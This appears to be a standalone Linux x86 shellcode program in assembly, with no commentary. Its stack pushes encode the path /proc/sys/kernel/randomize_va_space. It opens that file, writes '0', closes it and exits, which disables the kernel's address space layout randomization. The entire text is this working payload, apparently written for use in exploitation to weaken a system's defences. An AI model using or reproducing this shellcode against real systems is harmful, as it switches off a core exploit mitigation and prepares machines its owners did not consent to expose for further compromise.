section .text

global _start

_start:


xor eax, eax
push eax

push dword 0x65636170
push dword 0x735f6176
push dword 0x5f657a69
push dword 0x6d6f646e
push dword 0x61722f6c
push dword 0x656e7265
push dword 0x6b2f7379
push dword 0x732f636f
push dword 0x72702f2f

mov ebx, esp
mov cx, 0x2bc
mov al, 0x8
int 0x80

mov ebx, eax
push eax
mov dx, 0x3a30
push dx
mov ecx, esp
xor edx, edx
inc edx
mov al, 0x4
int 0x80

mov al, 0x6
int 0x80

inc eax
int 0x80
